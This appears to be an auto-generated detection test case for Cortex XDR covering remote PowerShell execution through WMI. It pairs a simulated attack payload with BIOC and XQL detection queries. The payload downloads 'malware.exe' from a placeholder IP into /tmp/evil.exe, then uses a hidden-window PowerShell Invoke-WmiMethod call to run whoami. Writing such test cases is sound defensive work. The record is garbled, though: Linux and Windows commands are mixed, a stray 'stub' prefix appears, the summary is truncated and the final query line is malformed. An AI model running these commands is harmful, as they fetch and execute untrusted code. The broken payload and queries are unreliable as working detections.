identity.name: Rare Process Execution via WMI and PowerShell in Organization
identity.summary: An attacker uses WMI to execute PowerShell remotely, triggering a rare process execution alert due to unusual command-line behavior. Cortex should detect this deviation from normal organizational proc
identity.description: An attacker uses WMI to execute PowerShell remotely, triggering a rare process execution alert due to unusual command-line behavior. Cortex should detect this deviation from normal organizational process usage.

payload.code:
wget http://192.0.2.50/malware.exe -O /tmp/evil.exe
stub chmod +x /tmp/evil.exe
powershell -w hidden -c "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'C:\\Windows\\System32\\cmd.exe /c whoami > C:\\temp\\output.txt'"

expected_artifacts.description: PowerShell process started with hidden window

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Rare Process Execution in Organization
biocs.description: Detection of a PowerShell process initiating a command-line execution that is not typical for the organization
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe' and action_process_image_name = 'cmd.exe'
| filter causality_actor_process_image_name != 'explorer.exe'
| filter action_file_path contains 'cmd.exe'
| filter action_command_line contains 'whoami'

abiocs.name: Unusual PowerShell Command-Line Usage
abiocs.description: Behavioral deviation where PowerShell is used to invoke WMI methods with command-line arguments not seen in normal usage patterns
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_command_line contains 'Invoke-WmiMethod'
| filter action_command_line contains 'Win32_Process'
| filter action_command_line contains 'Create'
| filter causality_actor_process_image_name != 'explorer.exe'
abiocs.causality_anchor: PowerShell process initiating WMI-based command execution

xql_queries.name: Detect Rare PowerShell WMI Execution
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_command_line contains 'Invoke-WmiMethod'
| filter action_command_line contains 'Win32_Process'
| filter action_command_line contains 'Create'
| filter causality_actor_process_image_name != 'explorer.exe'
| comp count() as cnt by agent_hostname, action_command_line
| comp count() as cnt by > 1
